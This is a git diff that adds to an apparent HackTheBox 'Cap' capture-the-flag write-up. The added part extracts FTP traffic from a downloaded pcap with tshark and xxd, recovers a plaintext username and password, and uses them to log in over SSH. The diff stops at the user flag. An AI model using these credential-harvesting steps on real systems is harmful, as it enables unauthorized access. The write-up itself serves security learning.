@@ -10,7 +10,7 @@ The first step is the recognition phase:
 nmap -sS -vvv --min-rate 5000 -Pn -p- --open -n 10.10.11.59 -oG allPorts
 ```
 The scan reports the following:
-```bash
+```java
 # Nmap 7.95 scan initiated Mon Dec 29 11:01:29 2025 as: /usr/lib/nmap/nmap --privileged -sS -vvv -p- --open -n -Pn --min-rate 5000 -oG allPorts 10.10.10.245
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
 Host: 10.10.10.245 ()   Status: Up
@@ -25,7 +25,7 @@ nmap -sCV -p21,22,80 10.10.10.245 -oN targeted
 
 ```
 The scan will reports the following:
-```bash
+```java
 # Nmap 7.95 scan initiated Mon Dec 29 11:03:06 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p21,22,80 -oN targeted 10.10.10.245
 Nmap scan report for cap.htb (10.10.10.245)
 Host is up (0.059s latency).
@@ -56,3 +56,98 @@ So after all this, we'll go to the page. We can see several sections: `/ip`, `/n
 It will redirect us to a page with a subdirectory called `/data/(int)`. Within that int value, it will take you to a random one, and you can download it below in .pcap format. 
 
 So, we're going to start (and finish) from the first one. We'll enter /data/0 and download the .pcap file.
+<div align="center">
+</div>
+<img width="1920" height="1080" src="https://github.com/JammerDEV-Es/HackTheBox-ReviewAndWriteup/blob/main/Cap/Images/Download%20the%20.pcap.png">
+</p>
+
+#
+
+We're going to examine the 0.pcap file we just downloaded using the CLI version of Wireshark, Tshark.
+So if we put this:
+```bash
+tshark -r /home/kali/Downloads/0.pcap
+```
+So we'll set more specific parameters for the capture
+```bash
+tshark -r /home/kali/Downloads/0.pcap -Tfields -e tcp.payload
+```
+```bash
+
+32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
+4c4953540d0a
+313530204865726520636f6d657320746865206469726563746f7279206c697374696e672e0d0a
+323236204469726563746f72792073656e64204f4b2e0d0a
+
+504f5254203139322c3136382c3139362c312c3231322c3134310d0a
+32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
+4c495354202d616c0d0a
+313530204865726520636f6d657320746865206469726563746f7279206c697374696e672e0d0a
+323236204469726563746f72792073656e64204f4b2e0d0a
+
+5459504520490d0a
+32303020537769746368696e6720746f2042696e617279206d6f64652e0d0a
+504f5254203139322c3136382c3139362c312c3231322c3134330d0a
+32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
+52455452206e6f7465732e7478740d0a
+353530204661696c656420746f206f70656e2066696c652e0d0a
+
+515549540d0a
+32323120476f6f646279652e0d0a
+```
+
+
+#### We'll be able to see the information, but in hash form. So let's translate it into human language.
+```bash
+tshark -r /home/kali/Downloads/0.pcap -Tfields -e tcp.payload | xxd -ps -r
+```
+We will use `xxd with the parameters -ps and -r` which serve the following purpose:
+
+- (-ps) (Plain Hexdump): Outputs the file's data in a continuous hex string without any extra formatting.
+- (-r) (Revert): It performs the reverse operation, converting a hex dump back into its original binary format.
+
+It will show us the following plain text (I'll just include the important part):
+
+```html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+220 (vsFTPd 3.0.3)
+USER nathan                          < - - - - - - - - -  (User)
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!                 < - - - - - - - - -  (Password)
+230 Login successful.
+SYST
+215 UNIX Type: L8
+PORT 192,168,196,1,212,140
+200 PORT command successful. Consider using PASV.
+LIST
+150 Here comes the directory listing.
+226 Directory send OK.
+PORT 192,168,196,1,212,141
+200 PORT command successful. Consider using PASV.
+LIST -al
+150 Here comes the directory listing.
+226 Directory send OK.
+TYPE I
+200 Switching to Binary mode.
+PORT 192,168,196,1,212,143
+200 PORT command successful. Consider using PASV.
+RETR notes.txt
+550 Failed to open file.
+QUIT
+221 Goodbye.
+```
+
+> User: Nathan
+
+> Password: Buck3tH4TF0RM3! 
+
+So now, with this information, we're going to do either an SSH or an FTP connection. I prefer SSH because the SSH shell is more stable than FTP.
+
+```bash
+ssh nathan@10.10.10.245
+```
+This will give us the user flag in the `/home/nathan/` directory.
